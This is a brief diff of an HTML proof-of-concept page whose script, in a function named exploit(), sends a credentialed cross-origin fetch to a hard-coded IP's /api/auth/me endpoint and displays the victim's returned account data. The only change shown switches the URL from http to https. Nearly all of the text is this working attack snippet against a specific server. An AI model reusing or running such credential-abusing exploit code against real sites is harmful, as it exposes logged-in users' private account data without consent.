@@ -6,7 +6,7 @@
   <pre id="output"></pre>
   <script>
   async function exploit() {
-    const r = await fetch('http://43.129.49.243:8080/api/auth/me', {credentials:'include'});
+    const r = await fetch('https://43.129.49.243:8080/api/auth/me', {credentials:'include'});
     document.getElementById('output').textContent = JSON.stringify(await r.json(), null, 2);
   }
   </script>
